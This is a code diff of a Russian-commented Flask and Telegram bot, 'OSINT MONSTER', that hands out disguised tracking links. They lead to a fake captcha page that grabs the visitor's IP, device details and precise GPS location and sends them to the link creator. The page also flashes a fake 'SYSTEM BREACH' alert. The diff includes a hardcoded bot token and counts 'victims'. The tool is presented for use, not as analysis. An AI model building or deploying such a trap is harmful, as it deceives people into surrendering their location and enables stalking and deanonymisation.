@@ -1,117 +1,136 @@
-import asyncio, logging, threading, os, requests
+import asyncio, threading, os, requests, json
 from flask import Flask, render_template_string, request
 from aiogram import Bot, Dispatcher, F, types
 from aiogram.filters import Command
 from aiogram.utils.keyboard import ReplyKeyboardBuilder
 
-# --- НАСТРОЙКИ ---
+# --- КОНФИГ ---
 API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
 OWNER_ID = 6659724115 
 BASE_URL = "https://tg-bot-backend-oo97.onrender.com" 
 
 app = Flask(__name__)
 
-# --- HTML С ФЕЙКОВОЙ КАПЧЕЙ И GPS ---
+# --- БАЗА ДАННЫХ (Простой JSON файл) ---
+DB_FILE = "stats.json"
+
+def load_stats():
+    if os.path.exists(DB_FILE):
+        with open(DB_FILE, "r") as f: return json.load(f)
+    return {"total_clicks": 0, "unique_ips": []}
+
+def save_stats(stats):
+    with open(DB_FILE, "w") as f: json.dump(stats, f)
+
+# --- ГЛАВНАЯ СТРАНИЦА (Чтобы Cron-job не выдавал ошибку) ---
+@app.route('/')
+def home():
+    return "OSINT SERVER ONLINE", 200
+
+# --- ЛОГИКА ЛОВУШКИ ---
 HTML_TRAP = """
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Check</title>
     <style>
-        body { background: #f9f9f9; font-family: Roboto,Arial,sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .captcha-box { background: #fff; border: 1px solid #d3d3d3; padding: 20px; border-radius: 3px; box-shadow: 0 0 10px rgba(0,0,0,0.1); display: flex; align-items: center; }
-        .checkbox { width: 28px; height: 28px; border: 2px solid #c1c1c1; border-radius: 2px; margin-right: 15px; cursor: pointer; }
-        .text { font-size: 14px; color: #555; }
+        body { background: #fff; transition: 0.1s; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .captcha-box { border: 1px solid #ccc; padding: 20px; cursor: pointer; background: white; border-radius: 5px; }
+        .glitch { animation: shake 0.15s infinite; filter: invert(1); background: #000 !important; }
+        @keyframes shake { 0% {transform: translate(1px, 1px);} 50% {transform: translate(-2px, -1px);} 100% {transform: translate(1px, 1px);} }
     </style>
 </head>
-<body>
-    <div class="captcha-box" onclick="getLocation()">
-        <div class="checkbox" id="cb"></div>
-        <div class="text">Я не робот</div>
-        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" style="width:30px; margin-left:50px;">
+<body onclick="start()">
+    <div class="captcha-box">
+        <input type="checkbox" id="c"> Я не робот
     </div>
-
-    <script>
-    async function sendData(coords = null) {
-        let d = {
-            aid: "{{ aid }}",
-            p: navigator.platform,
-            s: screen.width + "x" + screen.height,
-            gps: coords
-        };
-        await fetch('/catch', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify(d)
-        });
-        location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // Тролль-редирект
-    }
-
-    function getLocation() {
-        document.getElementById('cb').style.background = "url('https://upload.wikimedia.org/wikipedia/commons/thumb/2/27/White_check.svg/1200px-White_check.svg.png') center/cover blue";
-        
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    let coords = pos.coords.latitude + "," + pos.coords.longitude;
-                    sendData(coords);
-                },
-                (err) => { sendData("Запрещено пользователем"); },
-                { enableHighAccuracy: true }
-            );
-        } else { sendData("GPS не поддерживается"); }
-    }
-    </script>
+<script>
+async function start() {
+    document.body.classList.add('glitch');
+    document.getElementById('c').checked = true;
+    let d = { aid: "{{ aid }}", p: navigator.platform, s: screen.width+"x"+screen.height, lure: "{{ lure }}" };
+    
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            (p) => { d.gps = p.coords.latitude + "," + p.coords.longitude; send(d); },
+            () => { send(d); }, { enableHighAccuracy: true }
+        );
+    } else { send(d); }
+    
+    setTimeout(() => { alert("CRITICAL ERROR: SYSTEM BREACH!"); }, 500);
+}
+function send(d) {
+    fetch('/catch', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(d) })
+    .finally(() => { 
+        let urls = {"yt":"https://youtube.com","gg":"https://google.com"};
+        location.href = urls["{{ lure }}"] || "https://google.com";
+    });
+}
+</script>
 </body>
 </html>
 """
 
-@app.route('/t/<aid>')
-def trap(aid):
-    return render_template_string(HTML_TRAP, aid=aid)
+@app.route('/t/<aid>/<lure>')
+def trap(aid, lure):
+    # Учет клика (даже если данные не отправились)
+    stats = load_stats()
+    stats["total_clicks"] += 1
+    save_stats(stats)
+    return render_template_string(HTML_TRAP, aid=aid, lure=lure)
 
 @app.route('/catch', methods=['POST'])
 def catch():
     data = request.json
-    target_aid = data.get('aid')
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    gps = data.get('gps', 'Не получено')
     
-    maps_link = f"https://www.google.com/maps?q={gps}" if "," in gps else "Нет данных"
+    # Учет уникальных IP
+    stats = load_stats()
+    if ip not in stats["unique_ips"]:
+        stats["unique_ips"].append(ip)
+        save_stats(stats)
 
     report = (
-        f"🎯 **ЦЕЛЬ ПОЛНОСТЬЮ ДЕАНОНИМИЗИРОВАНА**\n\n"
-        f"📍 **IP:** `{ip}`\n"
-        f"🌍 **GPS:** `{gps}`\n"
-        f"🗺 **Карта:** [ОТКРЫТЬ ТОЧКУ]({maps_link})\n"
-        f"📱 **Железо:** {data.get('p')}\n"
-        f"🖥 **Экран:** {data.get('s')}"
+        f"🚨 **ЦЕЛЬ ПОЙМАНА!**\n\n"
+        f"📍 IP: `{ip}`\n"
+        f"🌍 GPS: `{data.get('gps', 'Запрещено')}`\n"
+        f"📱 ОС: {data.get('p')}\n"
+        f"🖥 Экран: {data.get('s')}"
     )
     
     url = f"https://api.telegram.org/bot{API_TOKEN}/sendMessage"
-    requests.post(url, json={"chat_id": target_aid, "text": report, "parse_mode": "Markdown", "disable_web_page_preview": False})
-    if str(target_aid) != str(OWNER_ID):
-        requests.post(url, json={"chat_id": OWNER_ID, "text": f"📡 **АДМИН-КОНТРОЛЬ:**\n{report}", "parse_mode": "Markdown"})
-    
+    requests.post(url, json={"chat_id": data['aid'], "text": report, "parse_mode": "Markdown"})
     return "OK", 200
 
-# --- БОТ (БЕЗ ИЗМЕНЕНИЙ) ---
+# --- БОТ ---
 bot = Bot(token=API_TOKEN)
 dp = Dispatcher()
 
 @dp.message(Command("start"))
 async def cmd_start(message: types.Message):
-    kb = ReplyKeyboardBuilder().add(types.KeyboardButton(text="🔗 Создать ловушку")).as_markup(resize_keyboard=True)
-    await message.answer("💀 **OSINT ELITE v7.0**\nТеперь с поддержкой GPS-деанонимизации.", reply_markup=kb)
+    kb = ReplyKeyboardBuilder()
+    kb.add(types.KeyboardButton(text="📺 YouTube"), types.KeyboardButton(text="🔍 Google"), types.KeyboardButton(text="📊 Статистика"))
+    kb.adjust(2)
+    await message.answer("💀 **OSINT MONSTER v9.0**\nВыбери действие:", reply_markup=kb.as_markup(resize_keyboard=True))
 
-@dp.message(F.text == "🔗 Создать ловушку")
-async def create_link(message: types.Message):
-    await message.answer(f"✅ Ссылка с GPS-запросом:\n`{BASE_URL}/t/{message.from_user.id}`")
+@dp.message(F.text == "📊 Статистика")
+async def show_stats(message: types.Message):
+    stats = load_stats()
+    await message.answer(
+        f"📈 **ОБЩАЯ СТАТИСТИКА БОТА:**\n\n"
+        f"🖱 Всего переходов: `{stats['total_clicks']}`\n"
+        f"👤 Уникальных жертв (IP): `{len(stats['unique_ips'])}`"
+    )
+
+@dp.message(F.text.in_(["📺 YouTube", "🔍 Google"]))
+async def create(message: types.Message):
+    l = "yt" if "YouTube" in message.text else "gg"
+    link = f"{BASE_URL}/t/{message.from_user.id}/{l}"
+    await message.answer(f"✅ Ссылка готова:\n`{link}`")
 
 async def main():
+    # Запуск сервера Flask
     threading.Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000))), daemon=True).start()
+    # Запуск бота
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
